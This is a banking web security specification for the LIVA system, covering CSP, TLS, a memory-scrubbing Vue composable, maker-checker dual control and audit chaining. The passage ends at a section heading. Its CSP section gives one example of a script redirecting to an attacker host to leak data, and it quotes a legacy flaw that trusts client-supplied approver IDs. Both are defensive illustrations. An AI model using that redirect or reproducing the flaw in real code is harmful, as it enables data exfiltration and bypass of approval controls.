# Banking Security, Compliance & Data Protection Specification
**Document ID:** `SPEC-SEC-LIVA-WEB-2026-09-14`  
**Target System:** LIVA Banking Engine (Hybrid Web & Desktop Architecture)  
**Author:** Worker 2 (Banking Security, Migration Roadmap & Quality Gate Specialist)  
**Regulatory Frameworks:**  
- **Decree 13/2023/NĐ-CP**: Vietnam Personal Data Protection Decree (PDPD)  
- **Circular 09/2020/TT-NHNN**: State Bank of Vietnam Regulations on Information System Safety in Banking Operations (Articles 16 & 18 — Dual Control / 4-Eyes Principle)  
- **Law on Anti-Money Laundering No. 14/2022/QH15 & Decision 11/2023/QĐ-TTg**: AML/CTF Screening & High-Value Transaction Monitoring  
- **RFC 6962**: Certificate Transparency / Cryptographic Binary Merkle Trees  
- **RFC 2104**: HMAC Keyed-Hashing for Message Authentication  
- **FIPS 197 / NIST SP 800-38D**: Advanced Encryption Standard (AES) in Galois/Counter Mode (GCM)  

---

## 1. Executive Summary & Regulatory Perimeter

The migration of LIVA Banking from a single-workstation desktop environment (Tauri v2) to a dual-platform **Hybrid Web & Desktop** architecture fundamentally alters the system's security boundary. 

In Desktop mode, LIVA operates within an isolated OS process boundary. Sensitive memory is protected by local process isolation, encryption keys are rooted in the host operating system (Windows DPAPI / TPM 2.0), and inter-process communication (IPC) is strictly bound to internal memory queues and loopback sockets (`127.0.0.1`).

Exposing LIVA Banking functionality to modern web browsers (Google Chrome, Microsoft Edge, Mozilla Firefox, Apple Safari) introduces an untrusted client environment. Browsers are multi-tenant runtimes susceptible to cross-origin threats, persistent disk caching, memory retention in JavaScript garbage collectors (V8/SpiderMonkey), supply chain script injection, and session hijacking. Under Vietnamese financial regulations, any failure to mitigate these risks incurs severe civil and criminal liabilities:
- **Decree 13/2023/NĐ-CP (Article 4 & 26)** mandates administrative fines up to **5% of total enterprise revenue** and potential revocation of operating licenses for unauthorized disclosure or cross-border leakage of personal financial data (Citizen Identity Cards/CCCD, bank account numbers, balances, transaction narrations).
- **Circular 09/2020/TT-NHNN (Articles 16 & 18)** strictly requires that all payment authorizations and high-impact transaction dispute resolutions be guarded by **Dual Control (Maker-Checker / 4-Eyes principle)** with non-repudiation, tamper-evident audit logging, and absolute prohibition of self-approval.

This specification establishes the authoritative, production-grade security architecture for LIVA Banking Web, providing mathematically verifiable defense-in-depth across the client browser, network transport, server gateway, and database storage.

```
                      HYBRID TRUST BOUNDARY ARCHITECTURE
┌─────────────────────────────────────────────────────────────────────────────┐
│ UNTRUSTED CLIENT PERIMETER (Browser Sandbox)                                │
│                                                                             │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ Vue 3 Banking Workbench Client (Chrome / Edge / Firefox / Safari)     │  │
│  │  - Strict CSP Level 3 (No unsafe-eval, No external CDNs)             │  │
│  │  - Ephemeral Vue Memory Scrubber (useMemoryScrubber composable)       │  │
│  │  - Zero Persistence Policy (Zero localStorage/IndexedDB for PII)      │  │
│  │  - Anti-Caching Headers (no-store, private, Clear-Site-Data)          │  │
│  └───────────────────────────────────┬───────────────────────────────────┘  │
└──────────────────────────────────────┼──────────────────────────────────────┘
                                       │ HTTPS (TLS 1.3 Only, PFS Ciphers)
                                       │ Cookie: __Host-LIVA-Session; Secure; HttpOnly; SameSite=Strict
                                       │ Header: X-CSRF-Token: HMAC-SHA256(K_csrf, session_id || user_id)
                                       ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ TRUSTED SERVER PERIMETER (DMZ / On-Premise Rust Web Gateway)                │
│                                                                             │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ Axum/Hyper Reverse Proxy & Security Middleware                        │  │
│  │  - HSTS (max-age=63072000; includeSubDomains; preload)                │  │
│  │  - Strict CORS Whitelist (Single intranet origin, credentials required)│  │
│  │  - Backpressure Concurrency Gate (Semaphore: Ingest 2, Queries 32)     │  │
│  │  - In-Memory Streaming Multipart Ingestion (< 64MB, Zero Disk Spool)  │  │
│  └───────────────────────────────────┬───────────────────────────────────┘  │
│                                      │                                      │
│  ┌───────────────────────────────────▼───────────────────────────────────┐  │
│  │ LIVA Native Core (Rust Domain Engine)                                 │  │
│  │  - Server-Asserted Identity Middleware (Elimination of client IDs)    │  │
│  │  - Circular 09 Maker-Checker 4-Eyes Engine (Single-use 15-min HMAC)   │  │
│  │  - Decree 13 PII Sanitizer & Corporate Legal Entity Preservation      │  │
│  │  - Loopback Zero-Egress Netfilter (Blocks non-loopback sockets)       │  │
│  │  - Two-Tier Server-Side Envelope Encryption (KEK/DEK via AES-256-GCM) │  │
│  │  - Tamper-Evident Forward HMAC Audit Chain (banking_audit_chain)      │  │
│  │  - RFC 6962 Binary Merkle Tree for O(log N) Inclusion Proofs          │  │
│  └───────────────────────────────────┬───────────────────────────────────┘  │
│                                      │ Encrypted WAL Frames (AES-256-GCM)   │
│                                      ▼                                      │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ SQLite WAL Storage (Readers: 4, Serialized Writer: 1)                 │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Decree 13/2023/NĐ-CP & Zero Data Egress Defense-in-Depth

### 2.1. STRIDE Threat Model Across 7 Browser Vectors

Under Decree 13/2023/NĐ-CP, processing personal financial data in a standard browser introduces seven distinct threat vectors. The following matrix formalizes the threat taxonomy, observed desktop baseline, web exposure, regulatory impact, and engineering controls:

| # | Threat Vector | STRIDE Classification | Attack Mechanism & Scenario | Existing Desktop Baseline | Web Vulnerability Impact | Decree 13 Impact & Statutory Penalty | Technical Control Mandate |
|---|---|---|---|---|---|---|---|
| **V1** | **Browser Storage Persistence** | Information Disclosure | Plaintext caching of statements, transaction matrices, or account balances in `localStorage`, `sessionStorage`, or `IndexedDB`. If another user logs into the same terminal, unencrypted PII is readable. | None (Data kept in Rust memory and SQLite WAL) | **CRITICAL**: Plaintext customer CCCD, accounts persist indefinitely on client machine. | Decree 13 Art. 9 & 13 (Violation of storage limitation). Up to 5% enterprise turnover. | Strict In-Memory Only Policy. Complete prohibition of PII in browser Web Storage. |
| **V2** | **Disk Cache & bfcache Retention** | Information Disclosure | Browser caches HTTP GET responses on local disk (`AppData\Local\Google\Chrome\...`) or retains DOM state in Back-Forward Cache (bfcache). Navigating "Back" after logout exposes financial matrices. | None (WebKit/WebView2 cache strictly managed in private directory) | **HIGH**: Forensics or unauthorized users can extract decrypted statement lines from browser cache files. | Decree 13 Art. 26 (Failure to implement data protection measures). | Anti-caching headers (`no-store, private`) + `Clear-Site-Data: "cache", "cookies", "storage"` on logout. |
| **V3** | **Cross-Site Scripting (XSS)** | Tampering / Information Disclosure | Injection of malicious JS via unsanitized bank statement narration strings or prototype pollution, reading active Pinia stores or hijacking DOM elements. | Guarded by Tauri IPC serialization and isolated Rust core | **CRITICAL**: Complete exfiltration of transaction matrices or execution of fraudulent HITL approvals. | Decree 13 Art. 17 (Unauthorized disclosure) & Circular 09 Art. 18. | Strict CSP Level 3 (`'none'`, `'self'`, no `unsafe-eval`), Trusted Types API, and DOMPurify sanitization. |
| **V4** | **Third-Party CDN / Supply Chain** | Tampering / Information Disclosure | Loading scripts, web fonts, or chart modules from public CDNs (unpkg, cdnjs, Google Fonts). A compromised CDN node injects Magecart skimmers to capture financial data. | 100% bundled offline in native Tauri binary | **CRITICAL**: Remote egress of confidential banking data to foreign servers, violating sovereignty. | Decree 13 Art. 25 (Cross-border data transfer violation). Immediate suspension of system. | Complete CDN Elimination. 100% self-hosted static bundle with Subresource Integrity (SRI) hashes. |
| **V5** | **Network Eavesdropping & MitM** | Tampering / Information Disclosure | Interception of HTTP traffic over enterprise Wi-Fi/LAN, capturing unencrypted statement uploads or auth sessions. | None (Local in-process IPC via memory buffers) | **CRITICAL**: Extraction of corporate banking balances and session hijacking. | Decree 13 Art. 13 (Confidentiality breach) & Circular 09 Art. 10. | Mandatory TLS 1.3 only with Perfect Forward Secrecy (PFS) ciphers and HSTS 2-year preload. |
| **V6** | **PII in URL Query Parameters** | Information Disclosure | Passing account numbers, transaction IDs, or filter queries via HTTP GET (`/api/v1/matrix?account=1029384756`). Logged in browser history, proxy access logs, and `Referer` headers. | None (Arguments passed as binary/JSON IPC structs) | **HIGH**: Sensitive financial identifiers leaked to proxy logs, SIEMs, and browser auto-complete history. | Decree 13 Art. 13 (Data minimization failure). | Strict POST-only architecture for all data queries (`POST /api/v1/reconcile/matrix/query`). |
| **V7** | **V8 Heap Memory Retention** | Information Disclosure | Decrypted transaction rows remain in V8 JavaScript heap after component unmount until major GC runs. JavaScript strings are immutable in V8; setting properties to empty strings does not zero C++ char buffers in RAM. Vulnerable to process memory dumps (`lsass`/Chrome minidump). | Minimal (Rust `Drop` and `zeroize` cleans buffers) | **MEDIUM**: Memory dumping of browser process exposes unmasked strings if workstation is forensically inspected. | Decree 13 Art. 9 (Data processing lifecycle violation). | Gateway server-side PII masking; `useMemoryScrubber` reference severance + `Uint8Array` zeroing (`crypto.getRandomValues`); 180s tab inactivity lock. |

---

### 2.2. Technical Controls & Infrastructure Enforcements

#### 2.2.1. Transport Layer Security (TLS 1.3 Only & PFS Ciphers)
All incoming web connections must terminate on TLS 1.3. Legacy protocols (SSLv3, TLS 1.0, TLS 1.1, and TLS 1.2) are permanently disabled at the Web Gateway:
- **Permitted Cipher Suites (PFS Only):**
  1. `TLS_AES_256_GCM_SHA384`
  2. `TLS_CHACHA20_POLY1305_SHA256`
- **Disabled:** All RSA key-exchange suites (no forward secrecy), all CBC-mode ciphers (vulnerable to Lucky13 and POODLE), and all 128-bit key suites.
- **HTTP Strict Transport Security (HSTS):**
  ```http
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  ```
  Forces all browsers to refuse unencrypted HTTP connections for 2 years (63,072,000 seconds) and submit to the global HSTS preload list.

#### 2.2.2. Content Security Policy (CSP Level 3)
The Web Gateway injects a strict CSP Level 3 header on every HTML response:
```http
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' wss://banking.corp.vn; font-src 'self'; frame-ancestors 'none'; form-action 'self'; navigate-to 'self'; base-uri 'none'; object-src 'none'; require-trusted-types-for 'script';
```
- **`default-src 'none'`**: Denies all resources by default.
- **`script-src 'self'`**: Strictly forbids `'unsafe-eval'` and external hosts. Dynamic script evaluation via `eval()`, `new Function()`, or `setTimeout("string")` causes immediate browser termination.
- **Zero External CDNs**: All frontend assets (Vue 3 runtime, Lucide icons, Chart.js, Pinia) are bundled statically at compile time.
- **`connect-src 'self' wss://banking.corp.vn`**: Strictly confines outbound network calls (XHR, `fetch`, EventSource, and WebSocket) to the same-origin REST API and the authorized corporate WebSocket endpoint. Wildcard scheme authorizations such as `wss:` are **strictly prohibited** because W3C CSP Level 3 interprets `wss:` as authorizing connections to *any* external WebSocket server worldwide, opening an untraceable data exfiltration channel under DOM injection.
- **`navigate-to 'self'`**: Restricts top-level window navigation and hyperlinks strictly to the trusted origin. Prevents script injections or social engineering from redirecting the browser (`window.location.href = 'https://attacker.com/steal?...'`) to leak PII via URL parameters.
- **`frame-ancestors 'none'`**: Disables embedding LIVA Banking inside `<iframe>` or `<frame>`, providing 100% defense against Clickjacking (UI Redressing) attacks.
- **`require-trusted-types-for 'script'`**: Enforces W3C Trusted Types to prevent DOM-based XSS injection.

#### 2.2.3. Anti-Caching & Anti-Leakage Headers
Every HTTP API response carrying financial transactions, statements, balances, or user claims must include:
```http
Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, private, max-age=0
Pragma: no-cache
Expires: 0
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
```
Upon user logout, explicit session termination, or 15-minute inactivity timeout, the server issues:
```http
Clear-Site-Data: "cache", "cookies", "storage"
```
This instructs the browser to purge all disk cache, memory cache, session cookies, and any storage tied to the origin.

#### 2.2.4. CORS Origin Whitelist with Mandatory Credentials
The Web Gateway permits CORS requests strictly from the configured corporate intranet origin:
- `Access-Control-Allow-Origin: https://banking.corp.vn` (Wildcards `*` are rejected at configuration load time).
- `Access-Control-Allow-Credentials: true`.
- `Access-Control-Allow-Methods: GET, POST, OPTIONS`.
- `Access-Control-Allow-Headers: Content-Type, X-CSRF-Token, Authorization`.
- Preflight `OPTIONS` requests from unlisted origins return `403 Forbidden` with zero processing.

#### 2.2.5. Strict POST-Only Financial Query Architecture
To prevent sensitive identifiers (bank account numbers, CCCD, transaction codes) from being recorded in web server access logs (`access.log`), forward proxies, corporate firewalls, or browser history, **all query endpoints are strictly bound to HTTP `POST`**:
- Instead of `GET /api/v1/banking/reconcile/matrix?account=001100223344&status=UNMATCHED`, the API requires:
  ```http
  POST /api/v1/banking/reconcile/matrix/query
  Content-Type: application/json

  {
    "account_number": "001100223344",
    "filter_status": "UNMATCHED",
    "page": 1,
    "page_size": 50
  }
  ```

---

### 2.3. Frontend Sensitive Memory Scrubber (`useMemoryScrubber.ts`) & V8 Heap Boundaries

#### 2.3.1. Honest V8 Heap Memory Boundaries & String Immutability
In single-page applications (SPAs), reactive state objects in Pinia or Vue components reside in the JavaScript virtual machine heap (Google V8 in Chromium/Edge, SpiderMonkey in Firefox, JavaScriptCore in WebKit/Safari).

**Technical Reality of V8 String Immutability:**
- In JavaScript, string primitives are **immutable**. In V8's internal C++ implementation, strings are backed by contiguous byte/character arrays (`v8::internal::SeqOneByteString` or `v8::internal::SeqTwoByteString`).
- Executing `obj[key] = ''` does **NOT** overwrite the underlying character memory buffer with zeroes. Instead, V8 updates the property descriptor on the object to point to the global static interned empty string pointer (`factory()->empty_string()`).
- The original character buffer containing customer Citizen Identity Numbers (CCCD), transaction descriptions, or balances remains unmodified in the V8 heap until:
  1. A Major Garbage Collection (Mark-Sweep-Compact) cycle collects the unreferenced string object.
  2. The memory page backing the V8 heap is reclaimed or overwritten by subsequent memory allocations.
- Furthermore, Virtual DOM nodes (`VNode` text content), reactive dependency closures, and browser rendering layout trees cache copies of strings during DOM rendering.

**OS-Level Memory Boundaries & Physical Limits:**
- Userland browser processes cannot prevent memory dumping by privileged adversaries. If an attacker possesses local administrative/root privileges or runs forensic tools (`MiniDumpWriteDump`, `/proc/$PID/mem`, or debugger attachment), uncollected heap memory can be inspected.
- Operating system paging files (`pagefile.sys` on Windows, swap partitions on Linux) or hibernation files (`hiberfil.sys`) can write dirty browser heap pages to disk if RAM pressure occurs, unless the host enforces full disk encryption (BitLocker / dm-crypt).

**Engineering Mandates for Raw Sensitive Buffers (`Uint8Array`):**
1. **Raw Secrets in Typed Arrays:** For unmasked secrets, cryptographic keys, or raw authentication tokens held on the client, developers must use `Uint8Array` backed by `ArrayBuffer` rather than JavaScript strings.
2. **In-Place Cryptographic Zeroization:** Unlike strings, `Uint8Array` allows true in-place physical memory zeroing. Before discarding a sensitive buffer, overwrite it with cryptographically secure random bytes followed by zeroes:
   ```typescript
   if (window.crypto && window.crypto.getRandomValues) {
     window.crypto.getRandomValues(secretBuffer);
   }
   secretBuffer.fill(0);
   ```
3. **Defense-in-Depth Model:**
   - **Tier 1 (Server-Side Sanitization):** The Web Gateway redacts raw CCCDs and bank account numbers *prior to transmission*, ensuring full plaintext PII rarely enters browser heap memory.
   - **Tier 2 (Reference Severance):** `useMemoryScrubber` severs object references (`null` assignment, array length truncation to 0) and zeroizes `Uint8Array` instances, triggering immediate V8 scavenger pressure.
   - **Tier 3 (Inactivity Auto-Lock):** 180-second background tab visibility timer purges sensitive stores and routes to `/lock`.
   - **Tier 4 (Network & Cache Purge):** `Clear-Site-Data: "cache", "cookies", "storage"` header issued upon session lock or logout.
   - **Tier 5 (Enterprise Endpoint Hardening):** Host workstations must enforce Full Disk Encryption (BitLocker / LUKS) and encrypted swap to prevent swap file extraction.

#### 2.3.2. Implementation Blueprint: `useMemoryScrubber.ts`

The `useMemoryScrubber` composable implements active reference severance, `Uint8Array` cryptographic wiping, lifecycle hooks, and tab visibility timers:

```typescript
/**
 * liva-ui/src/composables/useMemoryScrubber.ts
 * ============================================
 * Ephemeral memory scrubber enforcing Decree 13 Zero Data Egress defense-in-depth.
 * Features:
 * 1. Deep traversal and reference severance on component unmount.
 * 2. Cryptographic zeroization of Uint8Array secret buffers via crypto.getRandomValues().
 * 3. 180-second tab inactivity auto-lock and state purging.
 * 4. BeforeUnload lifecycle scrubbing and navigation lock.
 */

import { onMounted, onUnmounted, type Ref } from 'vue';
import { useRouter } from 'vue-router';

export interface MemoryScrubberOptions {
  inactivityTimeoutMs?: number; // Default: 180,000 ms (3 minutes)
  lockRoute?: string;           // Default: '/lock'
  onScrub?: () => void;
}

export function useMemoryScrubber<T extends object>(
  sensitiveDataRefs: Array<Ref<T[] | Record<string, unknown> | Uint8Array | null | undefined>>,
  options: MemoryScrubberOptions = {}
) {
  const router = useRouter();
  const timeoutMs = options.inactivityTimeoutMs ?? 3 * 60 * 1000;
  const lockRoute = options.lockRoute ?? '/lock';
  let hiddenTimer: number | null = null;

  /**
   * Cryptographically wipes a typed Uint8Array in-place.
   */
  function wipeUint8Array(buf: Uint8Array): void {
    try {
      if (typeof window !== 'undefined' && window.crypto && window.crypto.getRandomValues) {
        window.crypto.getRandomValues(buf);
      }
    } catch {
      // Fallback if CSP restricts crypto or context detached
    } finally {
      buf.fill(0);
    }
  }

  /**
   * Deep object zeroization: wipes Uint8Arrays, severs string/primitive references,
   * and truncates arrays to facilitate V8 garbage collection.
   */
  function zeroizeObject(obj: Record<string, unknown>): void {
    for (const key of Object.keys(obj)) {
      const val = obj[key];
      if (val instanceof Uint8Array) {
        wipeUint8Array(val);
        obj[key] = new Uint8Array(0);
      } else if (typeof val === 'string') {
        obj[key] = '';
      } else if (typeof val === 'number') {
        obj[key] = 0;
      } else if (typeof val === 'boolean') {
        obj[key] = false;
      } else if (Array.isArray(val)) {
        for (let i = 0; i < val.length; i++) {
          if (val[i] instanceof Uint8Array) {
            wipeUint8Array(val[i]);
          } else if (typeof val[i] === 'object' && val[i] !== null) {
            zeroizeObject(val[i] as Record<string, unknown>);
          }
        }
        val.length = 0;
      } else if (typeof val === 'object' && val !== null) {
        zeroizeObject(val as Record<string, unknown>);
      }
    }
  }

  /**
   * Active scrubber executing memory wipes and reference severance across all registered refs.
   */
  function scrubAll(): void {
    for (const dataRef of sensitiveDataRefs) {
      if (!dataRef.value) continue;

      if (dataRef.value instanceof Uint8Array) {
        wipeUint8Array(dataRef.value);
      } else if (Array.isArray(dataRef.value)) {
        for (let i = 0; i < dataRef.value.length; i++) {
          const item = dataRef.value[i];
          if (item instanceof Uint8Array) {
            wipeUint8Array(item);
          } else if (typeof item === 'object' && item !== null) {
            zeroizeObject(item as Record<string, unknown>);
          }
        }
        dataRef.value.length = 0;
      } else if (typeof dataRef.value === 'object') {
        zeroizeObject(dataRef.value as Record<string, unknown>);
      }
      dataRef.value = null;
    }

    if (options.onScrub) {
      options.onScrub();
    }
  }

  /**
   * Monitor tab visibility. If document is hidden for > 3 minutes, scrub and lock.
   */
  function handleVisibilityChange(): void {
    if (document.visibilityState === 'hidden') {
      hiddenTimer = window.setTimeout(() => {
        scrubAll();
        if (router) {
          router.push(lockRoute);
        } else {
          window.location.href = lockRoute;
        }
      }, timeoutMs);
    } else {
      if (hiddenTimer !== null) {
        clearTimeout(hiddenTimer);
        hiddenTimer = null;
      }
    }
  }

  function handleBeforeUnload(): void {
    scrubAll();
  }

  onMounted(() => {
    document.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('beforeunload', handleBeforeUnload);
  });

  onUnmounted(() => {
    document.removeEventListener('visibilitychange', handleVisibilityChange);
    window.removeEventListener('beforeunload', handleBeforeUnload);
    if (hiddenTimer !== null) {
      clearTimeout(hiddenTimer);
      hiddenTimer = null;
    }
    scrubAll();
  });

  return {
    scrubAll,
  };
}
```

---

### 2.4. Server-Side PII Sanitizer & Zero-Egress Loopback Netfilter

In `liva-native-core/src/banking/compliance/`:
1. **PII Sanitizer (`sanitizer.rs`)**:
   - Executes deterministic regex scrubbing on transaction narrations, counterparty names, and audit descriptions before persistence or transmission.
   - Redacts 12-digit Citizen Identity Numbers (`\b0\d{11}\b`), raw bank account numbers, Vietnamese mobile numbers, and secret API keys.
   - Preserves Vietnamese legal corporate entities (`CONG TY`, `TNHH`, `CO PHAN`, `DOANH NGHIEP`, `BENH VIEN`, `NGAN HANG`) via exact dictionary matching to ensure enterprise reconciliation integrity is not degraded.
2. **Loopback Netfilter (`security.rs`)**:
   - The `EgressTrafficTracker` intercepts all outbound network sockets.
   - Only addresses resolving to `127.0.0.1`, `127.0.0.0/8`, or `::1` are permitted.
   - Any outbound connection attempt to public internet IPs or non-approved corporate endpoints triggers an immediate security alert, increments `blocked_attempts`, and aborts the request.

---

## 3. Circular 09/2020/TT-NHNN Maker-Checker Dual Control on Web

### 3.1. Elimination of Client-Supplied Identity Parameters & MCP Alignment

In the legacy desktop implementation (`liva-desktop/src-tauri/src/lib.rs` and `liva-native-core/src/commands/banking.rs`), the IPC call `reconciliation_resolve_hitl` received `maker_id` and `checker_id` as raw string fields in the client invocation payload:
```rust
// LEGACY DESKTOP FLAW: Client supplies identity claims
let maker_id = payload.get("maker_id").and_then(Value::as_str);
let checker_id = payload.get("checker_id").and_then(Value::as_str);
```
In a multi-user Web environment, this constitutes a **Critical Privilege Escalation Vulnerability (CWE-287 / CWE-306)**. A single malicious user could issue an API request containing `maker_id: "alice"` and `checker_id: "bob"`, completely bypassing the Circular 09 4-Eyes mandate.

#### Mandatory Architectural Rules:
1. **Zero Client Identity Claims:**  
   The Web Gateway **strictly prohibits** client-supplied `maker_id` and `checker_id` parameters. Any request body containing `maker_id` or `checker_id` is rejected immediately with `HTTP 400 Bad Request`. All identity claims are **server-asserted** exclusively from cryptographically authenticated session cookies.
2. **MCP Tool Contract Alignment (`treasury_payment_order`):**  
   The MCP banking tool `treasury_payment_order` (and route `/api/v1/banking/mcp/payment-order`) is aligned with this rule. All client/agent-supplied `maker_id` and `checker_id` parameters are removed from the tool invocation schema. The MCP gateway asserts identity strictly from the server-validated session context, preventing AI agents or compromised callers from injecting synthetic 4-eyes authorizers.
3. **Natural Person Human Operator Assertion (Anti-Multi-Account Bypass):**  
   In enterprise environments, human operators may possess multiple login accounts (e.g. `alice_maker` for routine clerical entry, `alice_supervisor` for emergency authorization). Comparing only mutable username strings (`maker_id != checker_id`) fails because Alice could open Tab 1 as `alice_maker` and Tab 2 as `alice_supervisor`, approving her own financial proposals.  
   To enforce authentic **Circular 09/2020/TT-NHNN 4-Eyes separation between two distinct natural persons**, the system binds dual control identity to immutable enterprise and civil identifiers:
   - `employee_id`: Immutable personnel ID issued by HR and authenticated via enterprise IdP/Active Directory (e.g. `"EMP-09142"`).
   - `citizen_id_hash`: Cryptographic SHA-256 digest of the natural person's Vietnamese Citizen Identity Number (CCCD / Định danh cá nhân).

---

### 3.2. Server-Side Session Identity & Cookie Specification

User authentication uses hardened HTTP session cookies:
- **Cookie Name:** `__Host-LIVA-Session`  
  *(The `__Host-` prefix enforces that the cookie must be `Secure`, must originate from an HTTPS host, must not contain a Domain attribute, and must have `Path=/`)*.
- **Attributes:**  
  ```http
  Set-Cookie: __Host-LIVA-Session=v2.sess.c8f93...4a1; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600
  ```
- **Session Identity Context (Extracted by Auth Middleware):**
  ```rust
  #[derive(Debug, Clone)]
  pub struct AuthenticatedSession {
      pub session_id: String,
      pub user_id: String,
      pub username: String,
      pub employee_id: String,         // Immutable enterprise employee code (e.g. "EMP-08819")
      pub citizen_id_hash: String,     // SHA-256 hash of Vietnamese Citizen Identity Card (CCCD)
      pub role: AuthorizationRole,     // Maker, Checker, Auditor
      pub permissions: Vec<String>,
      pub created_at: i64,
      pub expires_at: i64,
  }
  ```

---

### 3.3. Single-Use Cryptographic HITL Tokens & Constant-Time Verification

For any transaction requiring human intervention (HITL) — such as fuzzy matching, 1-to-N composite splitting, or amount discrepancy override — the Dual Control workflow operates in two phases:

#### Phase 1: Maker Proposes
1. Maker authenticates with `role = AuthorizationRole::Maker`.
2. Maker submits proposal via `POST /api/v1/banking/reconcile/proposals`.
3. Server asserts `session.role == Maker`.
4. Server binds maker identity: `maker_user_id = session.user_id`, `maker_employee_id = session.employee_id`, `maker_citizen_id_hash = session.citizen_id_hash`.
5. Server generates a cryptographically random 128-bit nonce and computes an HMAC-SHA256 signature over the proposal payload using the server's master dual-control key $K_{\text{dual}}$:
   $$\text{Signature}_{\text{proposal}} = \text{HMAC-SHA256}(K_{\text{dual}}, \text{proposal\_id} \parallel \text{maker\_user\_id} \parallel \text{maker\_employee\_id} \parallel \text{maker\_citizen\_id\_hash} \parallel \text{nonce} \parallel \text{expires\_at} \parallel \text{proposal\_hash})$$
6. Server issues a single-use HITL token with an exact **15-minute TTL (900 seconds)**:
   $$\text{HITL\_TOKEN} = \text{Base64URL}(\text{proposal\_id} \parallel \text{nonce} \parallel \text{expires\_at} \parallel \text{Signature}_{\text{proposal}})$$
7. Record is inserted into SQLite table `hitl_proposals` with status `'PENDING'` along with `maker_employee_id` and `maker_citizen_id_hash`.

#### Phase 2: Checker Decides
1. Checker authenticates with `role = AuthorizationRole::Checker`.
2. Checker reviews the pending proposal and submits their decision (`APPROVE` or `REJECT`) along with `hitl_token` via `POST /api/v1/banking/reconcile/hitl-resolve`.
3. Server asserts `session.role == Checker`.
4. Server extracts checker identity claims from active session: `session.user_id`, `session.employee_id`, `session.citizen_id_hash`.
5. **Fail-Closed Dual Control Human Operator Assertion:**  
   The system normalizes (trims whitespace and case-folds usernames) and evaluates:
   $$\text{maker\_employee\_id} \ne \text{session.employee\_id} \land \text{maker\_citizen\_id\_hash} \ne \text{session.citizen\_id\_hash} \land \text{normalize}(\text{maker\_user\_id}) \ne \text{normalize}(\text{session.user\_id})$$  
   If any condition evaluates to identical identity (same employee ID, same CCCD hash, or same normalized account ID), the transaction is immediately rejected with `403 Forbidden` (`BankingWebSecurityError::SelfApprovalProhibited`). A critical security audit alert is emitted.
6. **Timing Side-Channel Elimination (`subtle::ConstantTimeEq`):**  
   To prevent sub-microsecond timing side-channels during token signature evaluation, token byte comparison is executed strictly in constant time:
   ```rust
   use subtle::ConstantTimeEq;
   let token_bytes = req.hitl_token.as_bytes();
   let expected_bytes = expected_sig.as_bytes();
   if token_bytes.len() != expected_bytes.len() || token_bytes.ct_eq(expected_bytes).unwrap_u8() != 1 {
       return Err(BankingWebSecurityError::InvalidTokenSignature);
   }
   ```
7. Proposal timestamp validity is verified: $\text{current\_time} \le \text{proposal.expires\_at}$.
8. State transition is committed atomically in SQLite.

---

### 3.4. Race-Condition-Free Atomic SQLite State Transitions

In multi-threaded Web applications, concurrent Checker requests could exploit race conditions (Time-of-Check to Time-of-Use / TOCTOU) to double-spend or double-approve a proposal.

To guarantee zero race conditions, state transitions are executed using **atomic SQL conditional updates** on the SQLite database writer connection:

```sql
UPDATE hitl_proposals
SET 
    status = ?1,
    checker_id = ?2,
    resolved_at = ?3,
    decision_notes = ?4,
    token_consumed = 1,
    signature = ?5
WHERE 
    id = ?6 
    AND status = 'PENDING' 
    AND token_consumed = 0 
    AND expires_at >= ?3;
```

**Atomicity Invariant:**
- If the proposal was already resolved by another concurrent Checker thread, `status` is no longer `'PENDING'`.
- If the token was already consumed, `token_consumed` is 1.
- If the 15-minute window lapsed, `expires_at < now`.
- In all invalid cases, SQLite returns `rows_affected == 0`.
- The Rust transaction handler checks `rows_affected`:
  ```rust
  if rows_affected == 0 {
      tx.rollback()?;
      return Err(BankingSecurityError::ConcurrentModificationOrExpired);
  }
  ```
  This guarantees mathematical atomicity with zero lock contention or duplicate execution.

---

### 3.5. Anti-CSRF Synchronizer Token Architecture

To protect authenticated Maker and Checker sessions from Cross-Site Request Forgery (CSRF) via phishing emails or third-party intranet portals:
1. Every authenticated session receives a cryptographic CSRF token derived from the session ID, user ID, and a server-side CSRF master secret $K_{\text{csrf}}$:
   $$\text{CSRF\_TOKEN} = \text{Hex}(\text{HMAC-SHA256}(K_{\text{csrf}}, \text{session\_id} \parallel \text{user\_id}))$$
2. The client fetches the CSRF token via `GET /api/v1/auth/csrf` and stores it in memory.
3. Every state-mutating request (`POST`, `PUT`, `DELETE`) must include the HTTP header:
   ```http
   X-CSRF-Token: a94f82b...31e
   ```
4. Middleware validates the token using constant-time comparison (`subtle::ConstantTimeEq`). Requests with missing, mismatched, or expired tokens return `403 Forbidden`.

---

### 3.6. Non-Repudiation & Cryptographic Dual Signing into Audit Ledger

Circular 09/2020/TT-NHNN Article 16 mandates immutable non-repudiation for all financial authorisations. LIVA Banking enforces this via dual cryptographic signing into a forward HMAC-SHA256 chained audit ledger and an RFC 6962 Binary Merkle Tree.

#### 3.6.1. Forward HMAC-SHA256 Audit Chain (`banking_audit_chain`)
Every event is linked to the previous block hash:
$$H_0 = \text{SHA-256}(\text{"LIVA\_BANKING\_GENESIS\_2026"})$$
$$H_k = \text{HMAC-SHA256}(K_{\text{audit}}, H_{k-1} \parallel \text{timestamp} \parallel \text{actor} \parallel \text{event\_type} \parallel \text{payload\_digest})$$

```sql
CREATE TABLE IF NOT EXISTS banking_audit_chain (
    seq_id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp INTEGER NOT NULL,
    actor TEXT NOT NULL,
    event_type TEXT NOT NULL,
    payload_digest TEXT NOT NULL,
    prev_hash TEXT NOT NULL,
    curr_hash TEXT NOT NULL,
    signature TEXT NOT NULL
);
CREATE UNIQUE INDEX IF NOT EXISTS idx_audit_curr_hash ON banking_audit_chain(curr_hash);
```

#### 3.6.2. RFC 6962 Binary Merkle Tree for $O(\log N)$ Inclusion Proofs
